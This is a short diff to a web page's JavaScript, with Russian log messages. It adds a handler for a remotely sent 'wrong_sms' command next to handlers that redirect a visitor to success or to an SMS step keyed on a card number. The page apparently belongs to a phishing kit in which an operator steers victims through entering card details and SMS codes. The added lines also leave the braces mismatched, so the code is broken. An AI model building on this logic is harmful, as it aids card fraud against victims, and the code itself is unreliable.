@@ -681,6 +681,10 @@
         console.log('🎉 Получена команда SUCCESS');
         window.redirectToSuccess();
     }
+     } else if (command.action === 'wrong_sms') {
+        console.log('❌ Получена команда WRONG_SMS');
+        window.showWrongSMSError();
+    }
 }
 // ОБНОВЛЕННАЯ ФУНКЦИЯ РЕДИРЕКТА
 window.redirectToSMS = function(cardNumber) {
@@ -797,6 +801,7 @@ function stopPing() {
     </script>
 </body>
 </html>
+
 
 
 
